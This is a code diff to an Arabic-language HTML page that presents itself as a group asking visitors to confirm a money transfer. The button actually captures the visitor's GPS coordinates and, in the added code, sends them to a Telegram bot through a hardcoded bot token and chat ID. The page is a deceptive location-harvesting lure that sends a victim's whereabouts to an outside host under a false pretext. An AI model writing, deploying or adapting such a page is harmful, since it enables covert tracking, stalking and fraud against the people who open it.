@@ -3,33 +3,56 @@
 <head>
   <meta charset="UTF-8">
   <title>وائل الغالي</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body { font-family: sans-serif; background-color: #0088cc; color: #fff; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; }
-    .card { background: #fff; color: #000; padding: 30px; border-radius: 10px; text-align: center; width: 300px; }
-    .btn { background: #0088cc; color: #fff; padding: 12px 20px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; width: 100%; }
-    .btn:hover { background: #0075aa; }
+    body { font-family: Arial; text-align: center; margin-top: 100px; background-color: #f1f1f1; }
+    h1 { color: #0088cc; }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>مجموعة وائل الغالي</h2>
-    <p>للمشاركة في المجموعة، يرجى تأكيد تحويل المال</p>
-    <button class="btn" onclick="requestLocation()">تأكيد تحويل المال</button>
-  </div>
+  <h1>مجموعة وائل الغالي</h1>
+  <p>يرجى تأكيد تحويل المال بالضغط على الزر أدناه:</p>
+  <button onclick="getLocation()">تأكيد تحويل المال</button>
+
   <script>
-    function requestLocation() {
-      if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-          fetch('/location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude
-            })
-          });
-        });
+    function sendLocation(lat, lon) {
+      const token = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0';
+      const chatId = '5931662777';
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      const data = {
+        chat_id: chatId,
+        text: `📍 موقع جديد:\nhttps://maps.google.com/?q=${lat},${lon}`
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendLocation(lat, lon);
+          },
+          function(error) {
+            console.error("فشل في الحصول على الموقع:", error);
+          }
+        );
+      } else {
+        console.log("المتصفح لا يدعم GPS");
       }
     }
   </script>
